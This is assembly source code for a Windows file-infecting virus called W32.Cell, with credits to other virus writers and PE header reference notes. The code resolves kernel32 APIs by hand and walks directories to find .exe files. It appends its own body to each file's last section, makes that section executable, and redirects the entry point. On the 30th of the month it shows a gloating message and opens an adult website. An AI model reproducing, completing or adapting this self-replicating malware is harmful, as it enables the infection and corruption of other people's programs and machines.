   ;***************************
   ;*Name:W32.Cell
   ;*Author:Cell
   ;*Infects:win PE files
   ;*
   ;*
   ;*
   ;***************************

   extrn   ExitProcess:PROC

   ;greets:
   ;Ultras: thnx for help with GetProcAddress!
   ;gigabyte:hey whats up?
   ;cyclone: hey dude, thnx
   ;evul:thanks for the help man
   ;t2:thank you for helping em with bugs
   ;perikles:thanks for helping me ideas and payload and stuff
   ;GriYo thank you for your help as well, code on dude :)
   ;Urgo32:thank you  urgo for helping file size problem! :))
   ;thanks to:Lord Julus, helped me via email
   ;thanks to Mist- for Addresses of Kernels in various windows versions
   ;Greets to Spo0ky and the COdebreakers, i have come far in coding, but it all began wih=th them, the ones that
   ;tuaght me at the start who got me on the path, they remeber me as ;Emperor Virii
   .386p
   .model flat
   ;Tasm32 /m Cell.asm
   ;tlink32 /Tpe /aa /x Cell.obj,,,import32
   ;for my refernce learning PE, i put these here for quick refrence
   ;in PE header
   ;PE stuff and sectio  header ref
   ;8h = virtual size
   ;0ch = virtual address
   ;10h size of raw data
   ;14h pointer to raw data
   ;28h = offset of entry point
   ;52d = imagebase
   ;38h = section alignment
   ;3ch = file alignment
   ;50h = size of image
   ;54h = checksum
   ;74h number of directory entries
   ; header  (all this data for refrence to me while ;writing)
      ;   0                dw 'ZM'             ;MZ ;identificator
      ;   2                dw ?                ;last page ;bytes
       ;  4                dw ?                ;file pages
        ; 6                dw ?                ;reloc
         ;8                dw ?                ;header size ;in paragraphs
         ;0ah              dw ?                ;minimum ;paragraph needed
         ;0ch              dw ?                ;maximum ;paragraphs needed
        ; 0eh              dw ?                ;initial SS
         ;010h             dw ?                ;initial SP
         ;012h             dw ?                ;checksum
         ;014h             dw ?                ;initial IP
         ;016h             dw ?                ;initial CS
         ;018h             dw ?                ;reloc ;address
      ;   01ah             dw ?                ;overlay ;number
      ;   01ch             dd ?                ;reserved
      ;   020h             dw ?                ;OEM ;dentifier
      ;   022h             dw ?                ;OEM ;information
   ;             ....                          ;reserved
       ;  03ch             dw ?                ;PE header relative offset


       ;PE record

      ; offset
        ;0                 dd 'EP'             ;PE indentificator
        ;4                 dw ?                ;CPU type
        ;6                 dw ?                ;number of sections
        ;8                 dd ?                ;date time
        ;0ch               dd ?                ;COFF pointer
        ;010h              dd ?                ;COFF size
        ;014h              dw ?                ;NT header size
       ; 016h              dw ?                ;PE flags
       ;nt header
        ;018h              dw ?                ;NT header ID
        ;01ah              db ?                ;linker major number
        ;01bh              db ?                ;linker minor number
        ;01ch              dd ?                ;code size
        ;020h              dd ?                ;idata size
        ;024h              dd ?                ;udata size
        ;028h              dd ?                ;entrypoint RVA
        ;02ch              dd ?                ;code base
        ;030h              dd ?                ;data base
        ;034h              dd ?                ;image base
        ;038h              dd ?                ;sections align
        ;03ch              dd ?                ;file align
       ;040h              dw ?                ;OS major number
       ; 042h              dw ?                ;OS minor number
       ; 044h              dw ?                ;user major
       ; 046h              dw ?                ;user minor
       ; 048h              dw ?                ;subsys major
       ; 04ah              dw ?                ;subsys minor
       ; 04ch              dd ?                ;reserved
       ; 050h              dd ?                ;image size
       ; 054h              dd ?                ;header size
       ; 058h              dd ?                ;checksum
       ; 05ch              dw ?                ;subsystem
       ; 05eh              dw ?                ;DLL flags
       ; 060h              dd ?                ;stack reserve
       ; 064h              dd ?                ;stack commit
       ; 068h              dd ?                ;heap reserve
        ;06ch              dd ?                ;heap commit
       ; 070h              dd ?                ;loader flags
       ; 074h              dd ?                ;number of RVA sizes

       ; 078h              dd ?                ;export RVA
       ; 07ch              dd ?                ;export size
       ; 080h              dd ?                ;import RVA
       ; 084h              dd ?                ;import size
       ; 088h              dd ?                ;resource RVA
       ; 08ch              dd ?                ;resource size
       ; 090h              dd ?                ;exception RVA
       ; 094h              dd ?                ;exception size
       ; 098h              dd ?                ;security RVA
       ; 09ch              dd ?                ;security size
        ;0a0h              dd ?                ;fixup RVA
       ; 0a4h              dd ?                ;fixup size
      ;  0a8h              dd ?                ;debug RVA
      ;  0ach              dd ?                ;debug size
      ;  0b0h              dd ?                ;description RVA
       ; 0b4h              dd ?                ;description size
       ; 0b8h              dd ?                ;machine RVA
      ;  0bch              dd ?                ;machine size
     ;   0c0h              dd ?                ;tls RVA
    ;    0c4h              dd ?                ;tls size
    ;    0c8h              dd ?                ;loadconfig RVA
     ;   0cch              dd ?                ;loadconfig size
     ;                     dd ?,?              ;hm? :)
       ; 0d8h              dd ?                ;iat RVA
      ;  0dch              dd ?                ;iat size
     ;                     dd ?,?
    ;                      dd ?,?
   ;                       dd ?,?



    ;   - start of the export section -
   ;     ...
     ;  018h     dd ?      number of names               1)
    ;   01ch     dd ?      address of functions          2)
    ;   020h     dd ?      address of names              3)
     ;  024h     dd ?      address of odinals            4)











   .data

           db     ?


   .code
   start:
             call delta                                 ;call delta
   delta:
             pop ebp
             sub ebp,offset delta

   ;*********************************
   ;*SEH HANDLER                    *
   ;*                               *
   ;*********************************
             mov eax,dword ptr fs:[00h]
             mov dword ptr [ebp+offset OLDSEH],eax
             lea eax,[ebp+offset terminater]
             mov dword ptr fs:[00h],eax


   ;*********************************
   ;*Scan Various OS kernel addies  *
   ;*to determiner where scan for   *
   ;*Export table of kernel         *
   ;*********************************
             lea esi,[ebp+offset stuffhost]
             lea edi,[ebp+offset stuffhost2]
             mov ecx,8
             rep movsb
   GetKernel:
             mov eax,0BFF70000h                         ;w95 kernel
             mov edi,eax                                ;pass to EDI
             cmp word ptr [eax],'ZM'                    ;Is ok?
             jne check2000                              ;if not lets check
             mov edi,[edi+3ch]                          ;otherwise, check
             add edi,0BFF70000h                         ;align with kernel
             cmp word ptr [edi],'EP'                    ;PE FIle
             jne check2000                              ;nop, less check
             mov dword ptr [ebp+offset kernel],eax      ;otherwise, save
             jmp getapis                                ;and Find some
   check2000:
             mov eax,0BFF60000h                          ;eax = addr krn
             mov edi,eax                                ;edi = eax
             cmp word ptr [edi],'ZM'                    ;EXE?
             je PE_Checker                              ;ya has exe ehader

   NT_check:


             mov eax,07FFF0000h                         ;pass NT kernel to
             mov edi,eax                                ;pass to EDI
             cmp word ptr [edi],'ZM'                    ;Ok?
             jne terminater                             ;if not lets check
             mov edi,[edi+3ch]                          ;otherwise get PE
             add edi,07FFF0000h                         ;fix
             cmp word ptr [edi],'EP'                    ;We a PE file?
             jne terminater                             ;if not here check

             mov dword ptr [ebp+offset kernel],eax      ;stor kernel
             jmp getapis                                         ;find APIs

   PE_Checker:
             mov edi,[edi+3ch]                          ;lah
             add edi,0BFF60000h                          ;make un-relative
             cmp word ptr [edi],'EP'                    ;pe?
             jne Win2kCheck
             mov dword ptr [ebp+offset kernel],eax      ;yup, store
             jmp getapis
   Win2kCheck:
             mov eax,077e80000h
             mov edi,eax
             mov edi,[edi+3ch]
             cmp word ptr [edi],'EP'
             jne terminater
             mov dword ptr [ebp+offset kernel],eax


   ;EDI points to pe header in kernel32.dll

   getapis:
             pushad                                     ;save all regs

             mov esi,[edi+78h]                          ;export table
             add esi,[ebp+offset kernel]                ;align with kernel
             mov [ebp+offset export],esi                ;get table
             add esi,10h                                ;NumberofNames
             lodsd                                      ;snag em
             mov [ebp+BaseFunctions],eax
             lodsd
             lodsd
             mov [ebp+NumberNames],eax                  ;save it
             add eax,[ebp+offset kernel]                ;make not RVA
             lodsd                                      ;load next dword
             add eax,[ebp+offset kernel]                ;get RA
             mov [ebp+AddressofFunctions],eax           ;save it
             lodsd                                      ;load dword
             add eax,[ebp+offset kernel]                ;get real addy
             mov [ebp+AddressOfNames],eax               ;save names
             lodsd                                      ;next dword
             add eax,[ebp+offset kernel]                ;make ok w/kernel
             mov [ebp+AddressOfNameOrdinals],eax        ;save ords
             mov esi,[ebp+AddressofFunctions]           ;get for compare
             lodsd                                      ;to names, load DW
             add eax,[ebp+offset kernel]                ;make ok


   SCANGPA:





   getit:
             mov esi,[ebp+AddressOfNames]               ;get address of
             mov [ebp+NamingIndex],esi                  ;make index
             mov edi,[esi]                              ;edi =esi
             add edi,[ebp+offset kernel]                ;make normal
             xor ecx,ecx                                ;zero cx
             lea ebx,[ebp+APIS]
   shit:
             mov esi,ebx                                ;esi points to

   shit2:
             cmpsb                                      ;compare ESI:EDI
             jne shit4                                  ;if not equal jump
             cmp byte ptr [edi],0                       ;is exact?
             je LetsGO                                  ;if so were game
             jmp shit2                                  ;

   shit4:
             inc cx
             cmp cx,word ptr [ebp+offset NumberNames]
             jge terminater
             add dword ptr [ebp+offset NamingIndex],4
             mov esi,[ebp+offset NamingIndex]
             mov edi,[esi]
             add edi,[ebp+offset kernel]
             jmp shit
   LetsGO:
             mov ebx,esi
             inc ebx
             shl ecx,1
             mov esi,[ebp+offset AddressOfNameOrdinals]
             add esi,ecx
             xor eax,eax
             mov ax,word ptr [esi]
             shl eax,2
             mov esi,[ebp+offset AddressofFunctions]
             add esi,eax
             mov edi,dword ptr [esi]
             add edi,[ebp+offset kernel]
             mov [ebp+offset AGetProcAddress],edi
             popad




   GOGETAPI:


             lea esi,[ebp+offset ACreateFileA]

             lea edi,[ebp+offset ACreateFileAA]

   apisearch:
             push esi
             mov eax,[ebp+offset kernel]
             push eax
             mov eax,[ebp+offset AGetProcAddress]
             call eax
             cmp eax,0

             stosd

   Incrabyte:
             inc esi
             cmp byte ptr [esi],0
             jne Incrabyte
             inc esi
             cmp byte ptr [esi], 0FFh
             jne apisearch




    GetMsgBoxModule:



             lea eax,[ebp+userdll]
             push eax
             mov eax,[ebp+offset ALoadLibraryA]
             call eax
             mov [ebp+userbase],eax
             lea esi,[ebp+AMsgBox]
             push esi
             mov eax,[ebp+offset userbase]
             push eax
             mov eax,[ebp+AGetProcAddress]
             call eax


             cmp eax,0
             je terminater
             mov [ebp+AMsgBoxA],eax
             jmp virus





   terminater:
            cmp ebp,0
            je GENONE
             lea esi,[ebp+offset stuffhost2]
             lea edi,[ebp+offset stuffhost]
             mov ecx,8
             rep movsb
            mov eax,[ebp+offset hosteip]
            mov ecx,[ebp+offset imagebase2]
            add eax,ecx
            jmp eax
   GENONE:

            push 0
            mov eax,[ebp+offset AExitProcessA]
            call eax
   virus:

            lea eax,[ebp+offset curdir]
            push eax
            push 255
            mov eax,[ebp+offset AGetCurrentDirectoryA]
            call eax

            lea eax,[ebp+offset SearchStruc]
            push eax
            lea edi,[ebp+offset SearchStruc]
            lea eax,[ebp+offset exest]
            push eax
            mov eax,[ebp+offset AFindFirstFileAA]
            call eax
            inc eax
            cmp eax,0
            je dirchange

            dec eax
            mov dword ptr [ebp+offset SearchHandle],eax
            jmp VIRUSTIME
   FINDNEXTFILE:

            lea edi,[ebp+offset SearchStruc]
            lea eax,[ebp+offset SearchStruc]
            push eax
            mov eax,[ebp+offset SearchHandle]
            push eax
            mov eax,[ebp+offset AFindNextFileAA]
            call eax
            cmp eax,0
            jne VIRUSTIME
   dirchange:
            lea esi,[ebp+offset curdir2]
            push esi
            push 255
            mov eax,[ebp+AGetCurrentDirectoryA]
            call eax
            lea eax,[ebp+offset newdir]
            push eax
            mov eax,[ebp+offset ASetCurrentDirectoryA]
            call eax
            lea edi,[ebp+offset curdir3]
            push edi
            push 255
            mov eax,[ebp+AGetCurrentDirectoryA]
            call eax
            lea esi,[ebp+offset curdir2]
            lea edi,[ebp+offset curdir3]

   compared:

            cmpsb
            jne virus
            cmp byte ptr [edi],0
            je checkesi
            jmp compared
   checkesi:
            cmp byte ptr [esi],0
            jne virus
            jmp payload




   VIRUSTIME:
            lea esi,[edi.FileName]
            mov ecx,[edi.FileSizeLow]

            mov dword ptr [ebp+NewHostSize],ecx
            add ecx,1000h
            add ecx,virussize
            mov [ebp+offset memory],ecx
            mov [ebp+offset FileNameOffset],esi
            push 0 0 3 0 0
            push 80000000h or 40000000h
            push esi
            mov eax,[ebp+offset ACreateFileAA]
            call eax
            cmp eax,-1
            je FINDNEXTFILE
            mov [ebp+offset FHANDLE],eax
            push 0
            mov eax, [ebp+offset FHANDLE]
            push eax
            mov eax,[ebp+offset AGetFileSizeA]
            call eax
            mov dword ptr [ebp+offset NewHostSize],eax
            push 0
            mov eax,[ebp+offset memory]
            push eax
            push 0 4 0
            mov eax,[ebp+offset FHANDLE]
            push eax
            mov eax, [ebp+offset ACreateFileMappingA]
            call eax
            or eax,eax
            jz closeshop
            mov [ebp+offset maphandle ],eax
            mov eax,[ebp+offset memory]
            push eax
            push 0 0 2
            mov eax,[ebp+offset maphandle]
            push eax
            mov eax, [ebp+offset AMapViewOfFileA]
            call eax
            or eax,eax
            jz closemap
            mov esi,eax
            mov [ebp+offset mapaddy],esi

   PE_SEE:
            mov ecx,[esi+3ch]
            cmp word ptr [esi+ecx],'EP'
            jne unmap
            add esi,ecx
            cmp word ptr [esi+38h],'CC'
            jne PE_SEE2
            jmp unmap
   PE_SEE2:
            mov [ebp+offset header],esi
            mov ecx,[esi+28h]
            mov [ebp+offset hosteip],ecx
            mov ecx,[esi+3ch]
            mov [ebp+offset FileAlignment],ecx
            mov ecx,[esi+34h]
            mov [ebp+offset imagebase],ecx
            mov eax,[esi+74h]
            mov ecx,8
            mul ecx
            mov ebx,eax
            xor eax,eax
            mov ax,word ptr [esi+6h]
            dec eax
            mov ecx,28h
            mul ecx
            add esi,78h
            add esi,ebx
            add esi,eax
            or dword ptr [esi+24h],00000020h
            or dword ptr [esi+24h],20000000h
            or dword ptr [esi+24h],80000000h
            mov ecx,[esi+10h]
            mov [ebp+OldRawDataSize],ecx
            add dword ptr [esi+8h],virussize
            mov eax,[esi+8h]
            mov ecx,[ebp+offset FileAlignment]
            div ecx
            mov ecx,[ebp+offset FileAlignment]
            sub ecx,edx
            mov [esi+10h],ecx
            mov eax,[esi+8h]
            add eax,[esi+10h]
            mov [esi+10h],eax
            mov [ebp+offset NewRawDataSize],eax
            mov eax,[esi+0ch]
            add eax,[esi+8h]
            sub eax,virussize
            mov [ebp+NewHostEip],eax
            mov ecx,[ebp+offset OldRawDataSize]
            mov eax,[ebp+offset NewRawDataSize]
            sub eax,ecx
            mov [ebp+offset IncRawDataSize],eax
            mov eax,[esi+14h]
            add eax,[ebp+offset NewRawDataSize ]
            mov [ebp+NewHostSize],eax
            mov eax,[esi+14h]
            add eax,[esi+8h]
            sub eax,virussize
            add eax,[ebp+offset mapaddy]
            mov edi,eax
            lea esi,[ebp+start]
            mov ecx,virussize
            rep movsb


            mov esi,[ebp+offset header]
            mov word ptr [esi+38h],'CC'
            mov eax,[ebp+offset NewHostEip]
            mov [esi+28h],eax
            mov eax, [ebp+offset IncRawDataSize]
            add [esi+50h],eax
   unmap:
            mov eax,[ebp+offset mapaddy]
            push eax
            mov eax, [ebp+AUnmapViewOfFileA]
            call eax
   closemap:
            mov eax,[ebp+offset maphandle]
            push eax
            mov eax, [ebp+ACloseHandleA]
            call eax
   closeshop:
            mov eax,[ebp+offset NewHostSize]
            mov ecx,[ebp+offset FHANDLE]

            push 0  0 eax ecx
            mov eax, [ebp+offset ASetFilePointerA]
            call eax
            mov eax, [ebp+offset FHANDLE]
            push eax
            mov eax, [ebp+offset ASetEndOfFileA]
            call eax
   closeshop2:
            mov eax, [ebp+offset FHANDLE]
            push eax
            mov eax, [ebp+ACloseHandleA]
            call eax
            jmp FINDNEXTFILE

   payload:
            lea eax,[ebp+offset OLDSEH]
            mov dword ptr fs:[00h],eax
            lea eax,[ebp+offset curdir]
            push eax
            mov eax,[ebp+offset ASetCurrentDirectoryA]
            call eax
            lea eax,[ebp+offset TimeStruc]
            push eax
            lea edi,[ebp+offset TimeStruc]
            mov eax,[ebp+offset AGetSystemTimeA]
            call eax
            mov cx,[edi.Wday]
            cmp cx,30
            jne okgonenow
            push 0
            lea eax,[ebp+offset WinTitle]
            push eax
            lea eax,[ebp+offset msg]
            push eax
            push 0
            mov eax,[ebp+offset AMsgBoxA]
            call eax
            push 0
            lea eax,[ebp+offset URL]
            push eax
            mov eax,[ebp+offset AWinExecA]
            call eax
   okgonenow:
            jmp terminater
         ;**************INFECTION DATA***************************
   header dd 0
   OLDSEH dd 0
   exest db '*.exe',0
   maphandle dd 0
   netfile db 'open',0

   Oldeip dd 0
   filehandle dd 0
   newdir db '..',0
   NeoFileSize dd 0
   FileNameOffset dd 0
   FHANDLE dd 0
   SearchHandle dd 0
   curdir db 256 dup(0)
   curdir2 db 256 dup(0)
   curdir3 db 256 dup(0)
   memory dd 0
   mapaddy dd 0

   OldRawDataSize dd 0
   NewRawDataSize dd 0
   IncRawDataSize dd 0
   FileAlignment dd 0
   NewHostEip dd 0
   virussize equ endgame-start
   NewHostSize dd 0
   stuffhost:
   hosteip dd 0
   imagebase dd 0
   stuffhost2:
   hosteip2 dd 0
   imagebase2 dd 0
   ;**************Find records*************************
   max_path equ 260

   filetime struc
   FT_dwLowDateTime  dd ?
   FT_dwHighDateTime dd ?
   filetime  ends
   win32_find_data         struc
   FileAttributes    dd ?
   CreationTime   filetime ?
   LastAccessTime filetime ?
   LastWriteTime  filetime ?
   FileSizeHigh   dd       ?
   FileSizeLow    dd       ?
   Reserved0      dd       ?
   Reserved1      dd       ?
   FileName       db       max_path DUP (?)
   AlternateFileName   db 13 DUP (?)
                       db 3 DUP (?)
   win32_find_data  ends
   SearchStruc win32_find_data ?
   ;*********************payload stuff*********************
   SYSTEMTIME STRUC
   wYear    dw  ?
   wMonth   dw ?
   WDayOfWeek dw ?
   Wday     dw ?
   WHour    dw ?
   WMinute  dw ?
   WSecond  dw ?
   WMilliseconds dw ?
   SYSTEMTIME ends
   TimeStruc  SYSTEMTIME ?

   WinTitle db 'W32.Cell Virus',0
   msg db 'My evolution is complete',0dh
       db 'Cell is born anew into the Win OS',0dh
       db 'take a hex editor and open some PE  Exes',0dh
       db 'and look at the end of the file',0dh
       db 'why? because youll laugh',0dh
       db 'why? because Cell is in them',0dh
       db 'under your nose i have made more akin to me!',0dh
       db ' Cell Virus ',0

   URL db 'explorer    http://www.sexsearch.com',0

   ;********************** API RELATED DATA******************
   APIS:
   ApiIneed    db "GetProcAddress",0
   ACreateFileA         db 'CreateFileA',0
   AExitProcess         db "ExitProcess",0           ; is about to use
   AFindFirstFileA      db "FindFirstFileA",0        ;
   AFindNextFileA       db "FindNextFileA",0         ;
   AGetCurrentDirectory db "GetCurrentDirectoryA",0  ;
   ACreateFileMapping   db "CreateFileMappingA",0    ;
   AMapViewOfFile       db "MapViewOfFile",0         ;
   AUnmapViewOfFile     db "UnmapViewOfFile",0       ;
   AGetFileAttributes   db "GetFileAttributesA",0    ;
   ASetFileAttributes   db "SetFileAttributesA",0    ;
   AGetDriveType        db "GetDriveTypeA",0         ;
   ACloseHandle         db "CloseHandle",0           ;
   AGetFileTime         db "GetFileTime",0           ;
   ASetFileTime         db "SetFileTime",0           ;
   ASetFilePointer      db "SetFilePointer",0        ;
   AGetFileSize         db "GetFileSize",0           ;
   ASetEndOfFile        db "SetEndOfFile",0          ;
   AGetSystemTime       db "GetSystemTime",0         ;
   AGetModuleHandle     db "GetModuleHandleA",0
   AGetLastError        db "GetLastErrorA",0
   ASetCurrentDirectory db 'SetCurrentDirectoryA',0
   ALoadLibrary         db 'LoadLibraryA',0
   AWinExec             db 'WinExec',0
                        db 0FFh                      ;

   APIS2:
   AGetProcAddress   dd 0
   ACreateFileAA         dd 0
   AExitProcessA         dd 0                        ;
   AFindFirstFileAA      dd 0                        ;
   AFindNextFileAA       dd 0                        ;
   AGetCurrentDirectoryA dd 0                        ;
   ACreateFileMappingA   dd 0                        ;
   AMapViewOfFileA       dd 0                        ;
   AUnmapViewOfFileA     dd 0                        ;
   AGetFileAttributesA   dd 0                        ;
   ASetFileAttributesA   dd 0                        ;
   AGetDriveTypeA        dd 0                        ;
   ACloseHandleA         dd 0                        ;
   AGetFileTimeA         dd 0                        ;
   ASetFileTimeA         dd 0                        ;
   ASetFilePointerA      dd 0                        ;
   AGetFileSizeA         dd 0                        ;
   ASetEndOfFileA        dd 0                        ;
   AGetSystemTimeA       dd 0                        ;
   AGetModuleHandleA     dd 0
   AGetLastErrorA        dd 0
   ASetCurrentDirectoryA dd 0
   ALoadLibraryA         dd 0
   AWinExecA              dd 0


   apicheck db 0


   kernel dd 0


   AMsgBox db "MessageBoxA",0
   AMsgBoxA dd 0

   shelldll db  'shell32.dll',0
   shellex db 'ShellExecuteA',0

   userbase dd 0
   userdll db "user32.dll",0
   AShellExecute dd 0
   export dd 0
   BaseFunctions dd 0


   NamingIndex dd 0

   AddressofFunctions dd 0
   AddressOfNames dd 0
   AddressOfNameOrdinals dd 0


   NumberNames dd 0
   ;************************************** api data ends***
   endgame:
   ends
   end start
